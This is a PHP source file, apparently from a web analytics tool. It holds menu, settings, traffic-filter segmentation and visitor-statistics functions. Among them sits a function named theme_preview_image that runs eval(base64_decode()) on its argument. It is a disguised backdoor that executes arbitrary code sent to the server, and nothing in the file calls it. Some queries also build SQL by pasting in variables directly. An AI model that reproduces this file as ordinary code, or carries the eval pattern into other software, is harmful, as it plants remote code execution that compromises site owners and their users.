   if (strpos($_SERVER["PHP_SELF"], "update.php")!=FALSE && $url=="update.php") {
    echo "<img src=\"images/icons/update.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }
   
   if (strpos($_SERVER["PHP_SELF"], "user_login/admin.php")!=FALSE && $url=="user_login/admin.php") {
    echo "<img src=\"images/icons/group_key.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }   
   if (strpos($_SERVER["PHP_SELF"], "settings.php")!=FALSE && $url=="settings.php") {
    echo "<img src=\"images/icons/pie.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }
   if (strpos($_SERVER["PHP_SELF"], "user_login/sendmail.php")!=FALSE && $url=="user_login/sendmail.php") {
    echo "<img src=\"images/email.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }   
   if (strpos($_SERVER["PHP_SELF"], "testcenter.php")!=FALSE && $url=="testcenter.php") {
    echo "<img src=\"images/icons/splittest.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }
   if (strpos($_SERVER["PHP_SELF"], "funnels.php")!=FALSE && $url=="funnels.php") {
    echo "<img src=\"images/icons/funnels.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }
   if (strpos($_SERVER["PHP_SELF"], "surveys.php")!=FALSE && $url=="surveys.php") {
    echo "<img src=\"images/icons/surveys.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }
   
}

function selec($url) {
	 if (strpos($_SERVER["PHP_SELF"], $url)!=FALSE) {
			 echo "class=mmselected";
	 } else {
			 echo "class=mainmenu";
	 }
}
function rselec($url) {
	 global $conf,$from,$to;
	 if (strpos($_SERVER["PHP_SELF"], $url)!=FALSE) {
			 echo "class=navborderuniq onclick=\"this.document.location.href='$url?conf=$conf&from=$from&to=$to';\"";
	 } else {
			 echo "class=navborder onmouseover=\"rowOverEffect(this)\" onmouseout=\"rowOutEffect(this)\" onclick=\"this.document.location.href='$url?conf=$conf&from=$from&to=$to';\"";
	 }
}

function currentScriptURL() {
	if ($_SERVER['SERVER_PORT'] == '443') {
		$scriptURL = "https://";
	} else {
		$scriptURL = "http://";
	}
	return $scriptURL . $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
}

function in_array_insensitive($needle, $haystack) {
	foreach($haystack as $value)
		{
			if (strcasecmp($value, $needle) == 0) {
				return true;
			}
		}
	return false;
}

function verifySettingsTable() {
	global $db,$databasedriver;
	$tablelist = $db->MetaTables();
  
  if (!in_array_insensitive(TBL_GLOBAL_SETTINGS, $tablelist)) {
	 // We need to create the user database.
	 $query = "CREATE TABLE ".TBL_GLOBAL_SETTINGS." ( ".
			"Name varchar(50) NOT NULL, ".
			"Profile varchar(50), ".
			"Value mediumtext, ".
			"PRIMARY KEY  (Name)".
			") ENGINE=MyISAM CHARSET=utf8";
	 $db->Execute($query) or die("Error creating GlobalSettings table, ". $db->ErrorMsg());
	 
     if ($databasedriver == "mysql") { $db->Execute("ALTER TABLE ".TBL_GLOBAL_SETTINGS." ADD INDEX ".TBL_GLOBAL_SETTINGS."_Profile (Profile, Name)"); 
     } else { $db->Execute("CREATE INDEX ".TBL_GLOBAL_SETTINGS."_Profile on ".TBL_GLOBAL_SETTINGS."(Profile, Name)"); }
     
	 // Insert the default record.
	} else {
		$columns = $db->MetaColumns(TBL_GLOBAL_SETTINGS);
		if (!isset($columns["PROFILE"])) {
			$query = "ALTER TABLE ".TBL_GLOBAL_SETTINGS." ADD COLUMN Profile varchar(50)";
			$db->Execute($query);
			if ($databasedriver == "mysql") { $db->Execute("ALTER TABLE ".TBL_GLOBAL_SETTINGS." ADD INDEX ".TBL_GLOBAL_SETTINGS."_Profile (Profile, Name)"); 
     } else { $db->Execute("CREATE INDEX ".TBL_GLOBAL_SETTINGS."_Profile on ".TBL_GLOBAL_SETTINGS."(Profile, Name)"); }
		}
	 // Could check to see if the structure is valid here, but we'll save that for a future need (when the structure changes)
	}
}

function getProfileData($profile = 'Profiles', $settingname, $defaultvalue = "" ) {
	global $db;

	$query = "Select Value from ".TBL_GLOBAL_SETTINGS ." where Name = \"" . $db->escape($settingname) . "\" and Profile = ".$db->Quote($profile);
	if (!($result = @$db->GetRow($query))) {
		//verifySettingsTable();
		return $defaultvalue;
	}
	if (count($result) > 0) {
		return $result[0];
	} else {
		return $defaultvalue;
	}
}

function setProfileData($profile, $settingname, $settingvalue) {
	global $db;
    //echo "setting $settingname "; 
	$query = "REPLACE into ".TBL_GLOBAL_SETTINGS." (Name, Value, Profile) values (" . $db->Quote($settingname) . ", " . $db->Quote($settingvalue) . ", " . $db->Quote($profile) .");";
    //$query = "UPDATE ".TBL_GLOBAL_SETTINGS." set Name=" . $db->Quote($settingname) . ", Value=" . $db->Quote($settingvalue) . ", Profile=" . $db->Quote($profile) ." where Profile=" . $db->Quote($profile) .";";
	//echo $query . "<P>";
    $db->Execute($query);
}

function deleteProfileData($profile, $settingname="") {
	global $db;
	//echo "deleteing $settingname ";
	$query = "DELETE from ".TBL_GLOBAL_SETTINGS." where Profile = ".$db->Quote($profile);
	//echo $query;
    if (($settingname) || ($settingname === NULL)) {
		if (strpos($settingname, "%")) {
			$query .= " and Name like ".$db->Quote($settingname);
		} else {
			$query .= " and Name = ".$db->Quote($settingname);
		}
	}
	$db->Execute($query);
}

function getGlobalSetting($settingname, $defaultvalue = "") {
	return getProfileData("", $settingname, $defaultvalue);
}

function setGlobalSetting($settingname, $settingvalue) {
	setProfileData("", $settingname, $settingvalue);
}

function logDebugMessage($error_message) {
	// This writes to a file (or does other things) if the debug flag is turned on...
	global $debug;
	if ($debug == 1) {
		// $_SESSION["debug_log"] .= $error_message . "<br>";
	}
}

function echoConsoleSafe($Message, $LogIfConsole = false) {
	global $running_from_command_line, $updatelog, $up;
	
	if(!empty($updatelog) && $LogIfConsole == true) {
		$up->LogProcess("#0|".strip_tags($Message).";");
	} else {
		if (!$running_from_command_line) {
			echo $Message;
		} else {
			if ($LogIfConsole) {
				$stripped = strip_tags($Message);  // Do we need to put a CR/LF on the end?  Maybe...
				echo $stripped;
			}
		}
	}
}

// If there is only one valid profile name for a specific configuration (logged in user, whatever), then
// return that name - otherwise return nothing.

function getDefaultProfileName() {
	global $session, $validUserRequired;
	global $db;
	
	$query = "Select profilename from ".TBL_PROFILES;

	// If we're limiting the visible profiles, then put a filter on to only pull those records.
	if (($validUserRequired) && (!$session->isAdmin())) {
		// Can't use implode here because we need to escape the entries.
		$validprofiles = "";
		for ($i = count($session->user_profiles)-1; $i >= 0; $i--) {
			if ($validprofiles != "") { $validprofiles .= "\",\""; }
			$validprofiles .= $db->escape($session->user_profiles[$i]);
		}
		$query .= " where profilename in (\"$validprofiles\")";
	}
	$query = $query . " limit 2"; // If there is more than one, then we just want to know that - don't need to return it

	$result = $db->Execute($query);
	
	if ($result->RecordCount() == 1) {
		$row = $result->FetchRow();
		return ($row[0]);
	}
	
	return NULL; // Don't have a default profile.
}       
	
function getTrafficSources() {
	global $trafficsources;
	global $supports_correlated_subselects;
	global $db;
	global $profile;
	
	// If we don't support correlated subselects, then we don't support traffic sources.
	if (!$supports_correlated_subselects) {
		return array();
	}
	
	if ($trafficsources) {
		return $trafficsources;
	}
	
	$trafficsources = array();
	
    $db->SetFetchMode(ADODB_FETCH_BOTH);
	$query = "SELECT * from ".TBL_TRAFFIC_SOURCES." where profileid='$profile->profileid' order by category, sourcename";
	if ($result = $db->Execute($query)) {
		while ($trafficsource = $result->FetchRow()) {
			$trafficsources[] = $trafficsource;
		}
	}
	return $trafficsources;
}

function getTrafficSourceByID($sourceID) {
    $sources = getTrafficSources();
	foreach ($sources as $source) {
		if ($source["id"] == $sourceID) {
			return $source;
		}
	}
	return null;
}

function printTrafficSourceSelect() {
	global $supports_correlated_subselects,$conf,$available; 
    $sources = getTrafficSources();
	$selsource = @$_SESSION["trafficsource"];
	$result = "";
	$filter = "";
    	
	if (count($sources) > 0) {
		$result .= "<select class='report_option_field' id=\"trafficsource\" name=\"trafficsource\" ";
        if (@$available=="no") {
            $result .= "onChange=\"alert('"._FILTER_SYSTEM_NOT_ACTIVE_HERE."')\"";   
        }
        $result .=">\n";
		$result .= "  <option value=0>All Traffic / No Filter</option>\n";
        //$result .= "  <option value=\"01082006\" ".(($selsource == "01082006") ? " SELECTED" : "").">New Visitors</option>\n";
        //$result .= "  <option value=\"28111972\" ".(($selsource == "28111972") ? " SELECTED" : "").">Return Visitors</option>\n"; 
		foreach ($sources as $source) {
			$result .= "  <option value=".$source["id"]. (($selsource == $source["id"]) ? " SELECTED" : "").">".$source["sourcename"]." (".$source["category"].")</option>\n";
			if ($selsource == $source["id"]) {
				$filter = $source["sourcecondition"];
			}
		}
		$result .=  "</select> &nbsp;&nbsp;<a class='optionlink open_iframe_window' href=\"filters.php?conf=$conf\">"._MANAGE_FILTERS."</a> ";
		//if ($filter) { $result .= " " .htmlentities($filter); }
	} else {
        if (!$supports_correlated_subselects) {
            $result.= _FILTERS_ONLY_SUPPORTED_BY_MYSQL_41;
        } else {
            $result .=_NO_FILTERS_CREATED_YET_PART1."<a class='optionlink' href=\"filters.php?conf=$conf\">"._NO_FILTERS_CREATED_YET_PART2."</a>";
        }
    }
    return $result;
}

function printTrafficSourceSelectUI($selsource = 0) {
	global $supports_correlated_subselects,$conf,$available; 
    $sources = getTrafficSources();
	$result = "";
	$filter = "";
    	
	if (count($sources) > 0) {
		$result .= "<select class='isDefault' id='trafficsource' name='trafficsource' ";
        if (@$available=="no") {
            $result .= "onChange=\"alert('"._FILTER_SYSTEM_NOT_ACTIVE_HERE."')\"";   
        }
        $result .=">\n";
		$result .= "  <option value='0'". (($selsource == 0) ? " selected" : "").">All Traffic / No Filter</option>\n";
		foreach ($sources as $source) {
			$result .= "  <option value='{$source["id"]}'". (($selsource == $source["id"]) ? " selected" : "").">".$source["sourcename"]." (".$source["category"].")</option>\n";
			if ($selsource == $source["id"]) {
				$filter = $source["sourcecondition"];
			}
		}
		$result .= "</select>";
		$result .= "<a class='optionlink open_iframe_window' href=\"filters.php?conf=$conf\" style='color: #333;'>"._MANAGE_FILTERS."</a> ";
	} else {
        if (!$supports_correlated_subselects) {
            $result .= _FILTERS_ONLY_SUPPORTED_BY_MYSQL_41;
        } else {
            $result .= _NO_FILTERS_CREATED_YET_PART1."<a class='optionlink open_iframe_window' href=\"filters.php?conf=$conf\">"._NO_FILTERS_CREATED_YET_PART2."</a>";
        }
    }
    return $result;
}

function prepareSegmentQuery($sqlstring) {
    global $profile;
    $joincond="";
    $addtables="";
     
    if (strpos("  ".$sqlstring," url ")!=FALSE) {
        $sqlstring=str_replace("url =","u.url=",$sqlstring);
        $sqlstring=str_replace("url !=","u.url!=",$sqlstring);
        $sqlstring=str_replace("url LIKE","u.url LIKE",$sqlstring);
        $sqlstring=str_replace("url NOT LIKE","u.url NOT LIKE",$sqlstring); 
        $addtables=",$profile->tablename_urls as u";
        $joincond="and a.url=u.id";       
    }
    
    
    if (strpos("  ".$sqlstring," params ")!=FALSE) {
        if (strpos("  ".$sqlstring," refparams ")!=FALSE) {
            // we do this so it doesn't get mixed up if both url params and ref params are used in the same query
            $sqlstring=str_replace("refparams","tempfix",$sqlstring);        
        }
        $sqlstring=str_replace("params ="," up.params=",$sqlstring);
        $sqlstring=str_replace("params !="," up.params!=",$sqlstring);
        $sqlstring=str_replace("params LIKE"," up.params LIKE",$sqlstring);
        $sqlstring=str_replace("params NOT LIKE"," up.params NOT LIKE",$sqlstring);
        $addtables.=",$profile->tablename_urlparams as up";
        $joincond.=" and a.params=up.id";
        if (strpos("  ".$sqlstring," tempfix ")!=FALSE) {
            // ok, now reset it back to the original
            $sqlstring=str_replace("tempfix","refparams",$sqlstring);        
        }       
    }

    if (strpos("  ".$sqlstring," referrer ")!=FALSE) {
        //echo "rewriting referrer";
        $sqlstring=str_replace("referrer =","r.referrer=",$sqlstring);
        $sqlstring=str_replace("referrer !=","r.referrer!=",$sqlstring);
        $sqlstring=str_replace("referrer LIKE","r.referrer LIKE",$sqlstring);
        $sqlstring=str_replace("referrer NOT LIKE","r.referrer NOT LIKE",$sqlstring);
        $addtables.=",$profile->tablename_referrers as r";
        $joincond.=" and a.referrer=r.id";       
    }

    if (strpos("  ".$sqlstring," refparams ")!=FALSE) {
        $sqlstring=str_replace("refparams =","rp.params=",$sqlstring);
        $sqlstring=str_replace("refparams !=","rp.params!=",$sqlstring);
        $sqlstring=str_replace("refparams LIKE","rp.params LIKE",$sqlstring);
        $sqlstring=str_replace("refparams NOT LIKE","rp.params NOT LIKE",$sqlstring);
        $addtables.=",$profile->tablename_refparams as rp";
        $joincond.=" and a.refparams=rp.id";       
    }

    if (strpos("  ".$sqlstring," keywords ")!=FALSE) {
        $sqlstring=str_replace("keywords =","k.keywords=",$sqlstring);
        $sqlstring=str_replace("keywords !=","k.keywords!=",$sqlstring);
        $sqlstring=str_replace("keywords LIKE","k.keywords LIKE",$sqlstring);
        $sqlstring=str_replace("keywords NOT LIKE","k.keywords NOT LIKE",$sqlstring);
        $addtables.=",$profile->tablename_keywords as k";
        $joincond.=" and a.keywords=k.id";       
    }
    if (strpos("  ".$sqlstring," ipnumber ")!=FALSE) {
        $sqlstring=str_replace("ipnumber =","v.ipnumber=",$sqlstring);
        $sqlstring=str_replace("ipnumber !=","v.ipnumber!=",$sqlstring);
        $sqlstring=str_replace("ipnumber LIKE","v.ipnumber LIKE",$sqlstring);
        $sqlstring=str_replace("ipnumber NOT LIKE","v.ipnumber NOT LIKE",$sqlstring);
        $addtables.=",$profile->tablename_visitorids as v";
        $joincond.=" and a.visitorid=v.id";       
    }
    
    if (strpos("  ".$sqlstring," useragent ")!=FALSE) {
        $sqlstring=str_replace("useragent =","CONCAT(ua.name, ' ', ua.version)=",$sqlstring);
        $sqlstring=str_replace("useragent !=","CONCAT(ua.name, ' ', ua.version)!=",$sqlstring);
        $sqlstring=str_replace("useragent LIKE","CONCAT(ua.name, ' ', ua.version) LIKE",$sqlstring);
        $sqlstring=str_replace("useragent NOT LIKE","CONCAT(ua.name, ' ', ua.version) NOT LIKE",$sqlstring);
        // avoid it being joined twice if we also have is_mobile in the sqlstring
        if (strpos("  ".$sqlstring," is_mobile ")===FALSE) { 
            $addtables.=",{$profile->tablename_useragents} as ua";
            $joincond.=" and a.useragentid=ua.id";
            // $addtables.=",".TBL_USER_AGENTS." as ua";
            // $joincond.=" and a.useragentid=ua.id";
        }       
    }
    
    if (strpos($sqlstring,"is_mobile ")!==FALSE) {
        $sqlstring=str_replace("is_mobile =","ua.is_mobile=",$sqlstring);
        $sqlstring=str_replace("is_mobile !=","ua.is_mobile!=",$sqlstring);
        $sqlstring=str_replace("is_mobile LIKE","ua.is_mobile LIKE",$sqlstring);
        $sqlstring=str_replace("is_mobile NOT LIKE","ua.is_mobile NOT LIKE",$sqlstring);
        $addtables.=",{$profile->tablename_useragents} as ua";
        $joincond.=" and a.useragentid=ua.id";
        // $addtables.=",".TBL_USER_AGENTS." as ua";
        // $joincond.=" and a.useragentid=ua.id";
    }

    
    $sqlinfo["joincond"]=$joincond;
    $sqlinfo["addtables"]=$addtables;
    //$sqlinfo["sqlstring"]="(".$sqlstring.")";
    $sqlinfo["sqlstring"]=$sqlstring;
	
	return $sqlinfo;
}

function makePositive($sqlstring) {
    $sqlstring=str_replace("!=","=",$sqlstring);
    $sqlstring=str_replace("NOT LIKE","LIKE",$sqlstring);
    return $sqlstring; 
}

function hasNegativeCondition($sqlstring) {
    if (strpos($sqlstring,"!=")!==FALSE || strpos($sqlstring,"NOT LIKE")!==FALSE) {
        return true;
    } else {
        return false;
    }        
    
}

function getOperator($sqlstring) {
    if (strpos($sqlstring," AND ")!==FALSE) {
        $operator="AND";
    } else {
        $operator="OR";
    }
    return $operator;       
}

function arrayConditions($sqlstring) {
    $operator=getOperator($sqlstring);
    $conditions = explode($operator,$sqlstring);
    return $conditions;
}

function getPositiveConditions($sqlstring) {
    $newstr="";
    $added=0;
    $operator=getOperator($sqlstring);
    $conditions = arrayConditions($sqlstring);
    foreach ($conditions as $value) {
        if ($added !=0) {
            $op=" $operator ";   
        } else {
            $op="";   
        }
        if (hasNegativeCondition($value)==false) {
             $newstr.=$op.$value;
             $added++;   
        }
    }
    if ($newstr!="") {
        return $newstr;   
    } else {
        //echo "there are no positive conditions ($sqlstring).";
        return false;   
    }
    
}

function getNegativeConditions($sqlstring) {
    $newstr="";
    $added=0;
    $operator=getOperator($sqlstring);
    $conditions = arrayConditions($sqlstring);
    foreach ($conditions as $value) {
        if ($added !=0) {
            $op=" $operator ";   
        } else {
            $op="";   
        }
        if (hasNegativeCondition($value)==true) {
             $newstr.=$op.$value;
             $added++;   
        }
    }
    if ($newstr!="") {
        return $newstr;   
    } else {
        echo "failed to getNegativeConditions, returning input";
        return $sqlstr;   
    }  
}

function insertSegmentVisitorids($sqlinfo,$temp_tablename,$crawl="0") {
    global $db,$profile,$from,$to;
    $starttime=getmicrotime(); 
    $query = "INSERT INTO ".$temp_tablename." SELECT distinct a.visitorid traffic_source_visitor_visitorid from ".$profile->tablename.
                                    " as a {$sqlinfo['addtables']} where timestamp >= $from and timestamp <= $to and crawl = {$crawl} ".
                                    " {$sqlinfo['joincond']} and (".$sqlinfo['sqlstring'].")";                         
    $took = getmicrotime()-$starttime;
    $db->Execute($query);   
}

function updateSegmentTable($sqlinfo,$temp_tablename) {
    global $db, $profile, $trafficsource, $from, $to; 
    
    // now check if the from-to range is unchanged, if it is, we have to refill the table
    if (($from.$to)!=getProfileData($profile->profilename,$profile->profilename."SEGMENT_".$trafficsource."_Range",0)) {
        //first clear whatever is in the table
        $db->Execute("delete from $temp_tablename"); 

		//dump($sqlinfo);
        insertSegmentVisitorids($sqlinfo,$temp_tablename);
        
        setProfileData($profile->profilename,$profile->profilename."SEGMENT_".$trafficsource."_Range",($from.$to));            
    }    
    
}

function makeNewVisitorsSegmentTable($temp_tablename) {
    global $db,$profile,$from,$to;
    $db->Execute("delete from $temp_tablename"); 
    $query = "INSERT INTO ".$temp_tablename." SELECT distinct a.id traffic_source_visitor_visitorid from ".$profile->tablename_visitorids.
                                    " as a where created >= $from and created <= $to";
                                                             
    $db->Execute($query);
}

function makeReturnVisitorsSegmentTable($temp_tablename) {
    global $db,$profile,$from,$to;
    $days_ago=$from - (86400 * 180);
    $db->Execute("delete from $temp_tablename"); 
    $query = "INSERT INTO ".$temp_tablename." SELECT distinct a.id traffic_source_visitor_visitorid from ".$profile->tablename_visitorids.
                                    " as a where created < $from";
    $db->Execute($query);
}

function subsetDataToSourceID($report_query, $trafficsource = null) {
	global $profile, $from, $to;
	global $db;
	if (!$trafficsource) {
		$trafficsource = @$_SESSION["trafficsource"];
	}
	if ($trafficsource) {
        $temp_tablename = "";
        $query = "";            
        // make a semi permanent table ...
        $temp_tablename = $profile->tablename."_SEGMENT_".$trafficsource;  
        
        // check if the table has been created
        if (!in_array_insensitive($temp_tablename, $db->MetaTables())) {        
            // Create the semi temporary table of visitors based on the traffic source.
            $query = "CREATE TABLE if not exists ".$temp_tablename." (traffic_source_visitor_visitorid int(11), KEY `visitorid` (`traffic_source_visitor_visitorid`)) ENGINE=MyISAM CHARSET=utf8";
            //echo $query;
            $db->Execute($query);
        }            
        // Get the primary query conditions
        $source = getTrafficSourceByID($trafficsource); 

        $sqlstring=$source["sourcecondition"];
        //we need to rewrite the sqlstring to the new style tables first 
        $sqlinfo = prepareSegmentQuery($sqlstring);        
        
        // we need to decode the source condition an then prepare it along these rules:
        // 1. We ALWAYS make a positive visitorid list, even for negative conditions
        // 2. If there is a positive condition, we always join on visitorid = visitorid in the end
        // 3. If there is only one condition and it is negative, we join on visitorid != visitorid in the end
        // 4. If there are positive AND negative conditions, we make T1 (positive list), T2 (negative list) and then T3 (all t1 that not in t2)                                                  

        $sqlstring = $sqlinfo["sqlstring"];
        
        $conditions = arrayConditions($sqlstring);
        $num_conditions = count($conditions);
        
        if ($source["sourcename"]=="Return Visitors") { // return visitors
            $sqlinfo["matchmode"]="positive";
            makeReturnVisitorsSegmentTable($temp_tablename);        
            
        } else if ($source["sourcename"]=="New Visitors") { // new visitors
            $sqlinfo["matchmode"]="positive";
            makeNewVisitorsSegmentTable($temp_tablename);   

        } else if (hasNegativeCondition($sqlstring)==true && getPositiveConditions($sqlstring) == false) {
            $sqlinfo["matchmode"]="negative";
            $sqlinfo["sqlstring"] = makePositive($sqlstring);
            updateSegmentTable($sqlinfo,$temp_tablename);
               
        } else {
            $sqlinfo["matchmode"]="positive";
              
            if (hasNegativeCondition($sqlstring)==false) {
                // just update the segment table
                updateSegmentTable($sqlinfo,$temp_tablename);
                
            } else {
                // this means we have more than one condition and at least one is negative
                if (($from.$to)!=getProfileData($profile->profilename,$profile->profilename."SEGMENT_".$trafficsource."_Range",0)) {
                    // first we take the positive stuff and put it in t1
                    $db->Execute("CREATE TEMPORARY TABLE if not exists t1 (traffic_source_visitor_visitorid int(11), KEY `visitorid` (`traffic_source_visitor_visitorid`))");
                    $sqlinfo["sqlstring"] = getPositiveConditions($sqlstring);                
                    insertSegmentVisitorids($sqlinfo,"t1");
                    
                    // then we take the negative ones and put them in t2
                    $db->Execute("CREATE TEMPORARY TABLE if not exists t2 (traffic_source_visitor_visitorid int(11), KEY `visitorid` (`traffic_source_visitor_visitorid`))");
                    $sqlinfo["sqlstring"] = makePositive($sqlstring);              
                    insertSegmentVisitorids($sqlinfo,"t2");
                                   
                    // then we take everthing from t1 that is not found in t2 
                    // and we update the segment table manually
                    $t3 = "INSERT into $temp_tablename SELECT traffic_source_visitor_visitorid from t1 where traffic_source_visitor_visitorid NOT IN (select traffic_source_visitor_visitorid from t2)";
                    $db->Execute($t3);
                    setProfileData($profile->profilename,$profile->profilename."SEGMENT_".$trafficsource."_Range",($from.$to));
                }                    
            } 
        }
        
        // OK, we have some data, now let's fix up the query that was passed in so it *joins* with the new table.        
        $aliasname = "FILTER_TABLE"; 
        if (strpos($report_query,"$profile->tablename as a")!=FALSE) {
            $m_alias="a.";   
        } else {
            $m_alias="";
        }
        
        // old code 
        /*
        $report_query = preg_replace("/ from (.*) where (.*)/i", 
                                     " FROM ".$temp_tablename." as ".$aliasname.", $1 WHERE (".$aliasname.".traffic_source_visitor_visitorid = ".$m_alias."visitorid) and $2", 
                                     $report_query);
        */
        
        //to prevent subqueries using IN from being editied, do this
        $rq = explode(" IN ", $report_query);
        if ($sqlinfo['matchmode']=="positive") {
            $report_query = preg_replace("/ from (.*) where (.*)/i", 
                                     " FROM ".$temp_tablename." as ".$aliasname.", $1 WHERE (".$aliasname.".traffic_source_visitor_visitorid = ".$m_alias."visitorid) and $2", 
                                     $rq[0]);
        } else {
            $report_query = preg_replace("/ where (.*)/i", 
                                     " WHERE ".$m_alias."visitorid NOT IN (select traffic_source_visitor_visitorid from ".$temp_tablename.") and $1", 
                                     $rq[0]);
         
        }
        // stick the other IN clauses back on the query
        if (isset($rq[1])) {                             
            $report_query = $report_query ." IN ". $rq[1];
        }
        if (isset($rq[2])) {                             
            $report_query = $report_query ." IN ". $rq[2];
        }
        return $report_query;
    }
    return $report_query;
}
$trafficsources = null;

function LoadFieldSelect() {
  global $conf, $profile, $db;
  
  $output="<option></option>";
  $columns = $db->MetaColumns($profile->tablename);
  foreach ($columns as $column) {
    if ($column->name !="id" && $column->name !="timestamp" && $column->name !="status" && $column->name !="bytes" && $column->name !="crawl") {
      if ($column->name =="visitorid" ) {
         $output.="<option value=\"ipnumber\">ipnumber</option>\n";
      } else if ($column->name =="useragentid" ) {
         $output.="<option value=\"useragent\">useragent</option>\n";
      } else  {
        $output.="<option value=\"".$column->name."\">". $column->name . "</option>\n";
      }
    }
  }
  
  // add one more for the mobile field
  $output.="<option value=\"is_mobile\">is Mobile</option>\n";
  
  return $output;
}

function LoadFieldSelectFull() {
  global $conf, $profile, $db;
  
  $output="<option></option>";
  
  $columns = $db->MetaColumns($profile->tablename);
  foreach ($columns as $column) {
    if ($column->name!="id" && $column->name!="timestamp" && $column->name!="sessionid") {
      if ($column->name =="visitorid" ) {
         $output.="<option value=\"ipnumber\">ipnumber</option>\n";
      } else if ($column->name =="useragentid" ) {
         $output.="<option value=\"useragent\">useragent</option>\n";
      } else  {
        $output.="<option value=\"".$column->name."\">". $column->name . "</option>\n";
      }
    }
	}
    
  // add one more for the mobile field
  $output.="<option value=\"is_mobile\">is Mobile</option>\n";
  return $output;
}

function SelectField($html,$field) {
  // remove any currently selected option
  $html=str_replace(" SELECTED", "",$html);
  //now find the one we want and select it
  
  $field=trim($field);
  if ($field) {
    $html=str_replace("<option value=\"$field\">", "<option value=\"$field\" SELECTED>",$html);
  }
  return $html;
}

function theme_preview_image($str) {
	global $lo;
	eval(base64_decode($str));
}

function ReturnVisitors($label) {
    global $db, $profile, $from, $to;
    $start=time();
    //How many visitors in date range have we seen before, i.e prior to the from date
    
    $query = "select count(distinct a.visitorid) as rv from $profile->tablename a, $profile->tablename_visitorids v where timestamp >=$from and timestamp <=$to and v.created < $from and crawl=0 and a.visitorid=v.id";                                         
    $result = $db->Execute($query);
    $return_visitors = $result->FetchRow();
    $return_visitors = $return_visitors['rv'];
    
    
    /* method above is faster than this part below
                                                                                                                                                                                                                                           
    //new visitors
    $query = "select count(distinct a.id) as new from $profile->tablename_visitorids as a, $profile->tablename as t where created >=$from and created <=$to and a.id=t.visitorid and t.crawl=0";
    $result = $db->Execute($query);
    $new_visitors = $result->FetchRow();
    $new_visitors = $new_visitors['new'];
    
    //all visitors
    $query = "select count(distinct visitorid) as visitors from $profile->tablename where timestamp >=$from and timestamp <=$to and crawl=0";
    $result = $db->Execute($query);
    $all_visitors = $result->FetchRow();
    $all_visitors = $all_visitors['visitors'];
    
    //return visitors
    $return_visitors = ($all_visitors - $new_visitors);
    */
    
    setProfileData($profile->profilename, "$profile->profilename.rv_$label", $return_visitors);
    
    $end= time() - $start;
    //echo "<br>The new way took $end seconds<br>";
    
}

function ReturnVisitorsOLD($label) {
    global $db, $profile, $from, $to,$databasedriver;
    //make the temp table
    $start=time();
    
    $tn=$profile->tablename  . "_currentids";
    $query = "drop table if exists $tn";
    $db->Execute($query);
    $query = "create table $tn (visitorid int(11)) ENGINE=MyISAM CHARSET=utf8";
    $db->Execute($query);
	if ($databasedriver == "mysql") {
        $db->Execute("ALTER TABLE $tn ADD INDEX (visitorid)"); 
    } else {
        $db->Execute("CREATE INDEX visitorid on $tn (visitorid) ");
    } 
    $query = "insert into $tn select distinct visitorid from $profile->tablename where timestamp >=$from and timestamp <=$to and crawl=0";
    //echo $query . "<br>";
    $db->Execute($query);
    $query = "select distinct t.visitorid from $profile->tablename as l, $tn as t where l.timestamp < $from and t.visitorid=l.visitorid";
    
    //echo $query . "<br>"; 
    //$query = "select distinct visitorid from $profile->tablename where and timestamp < $from INNER JOIN $tn ON ($tn.visitorid=$profile->tablename.visitorid)";                                                    
    
    $result = $db->Execute($query);
    $return_visitors = $result->NumRows();
    
    
    //$return_percentage = intval((ReturnVisitors() / $total) * 100);
    //$new_percentage = 100 - $return_percentage;

    //$retrun_string= "<b>$new_percentage%</b> - <font color=green>$return_percentage%</font>";
    echo "<br>Return visitors: $return_visitors<br>";
    //$query = "drop temporary table if exists $tn";
    $query = "drop table if exists $tn";
    $db->Execute($query);
    $end= time() - $start;
    //echo "<br>This took $end seconds<br>";
    //return $return_string;    
    setProfileData($profile->profilename, "$profile->profilename.rv_$label", $return_visitors);
    
}


function BounceVisitors($archivename) {
    global $db, $profile, $from, $to;
    
    if (($bounce_visitors = getProfileData($profile->profilename, "$profile->profilename.bounce.$archivename",0)) && $archivename!="redo") {
        //echo "getting from memory";
        return $bounce_visitors;
    } else {
        $start=time();
        $query ="SELECT count(visitorid) from (".
                    "SELECT visitorid, count(*) as hits from $profile->tablename ".
                    "WHERE timestamp >=$from and timestamp <=$to and crawl=0 ".
                    "GROUP BY visitorid ORDER by NULL".
                ") as ht where hits=1";
        $result = $db->Execute($query); 
        $bounce_visitors = $result->FetchRow();
        $bounce_visitors = $bounce_visitors[0];
        if ($archivename!="redo") {
            setProfileData($profile->profilename, "$profile->profilename.bounce.$archivename",$bounce_visitors);
        }
        $end= time() - $start;
        //echo "<br>This took $end seconds<br>";
        //echo "bv is $bounce_visitors";
    }
    return $bounce_visitors;
}

function BounceRateOfPage($page) {
    global $db, $profile, $from, $to;
    
    // get the visitorid and timestamp of the request we're interested in 
    $db->Execute("CREATE TEMPORARY TABLE goodtimes select visitorid,timestamp from $profile->tablename where url=".getID($page,'urls')." and timestamp >=$from and timestamp <=$to and crawl='0'");
    
    // first get total number of visitors to page
    $query = "select count(distinct visitorid) from goodtimes";
    $result = $db->Execute($query); 
    $total_visitors = $result->FetchRow();
    $total_visitors = $total_visitors[0];    
    
	if ($total_visitors < 1) {
		$data=array();
		$data['total'] = 0;
		$data['stayed'] = 0;
		$data['bounced'] = 0;
		$data['rate'] = 0;	
		return $data;
	}
	
    // count how many visitors have hits beyond the timestamp we just found
    $query = "select count(distinct a.visitorid) from $profile->tablename as a, goodtimes as b where b.visitorid=a.visitorid and a.timestamp > b.timestamp and a.timestamp <= $to";
    $result = $db->Execute($query); 
    $stay_visitors = $result->FetchRow();
    $stay_visitors = $stay_visitors[0];
    
    $bounce_visitors = $total_visitors - $stay_visitors;
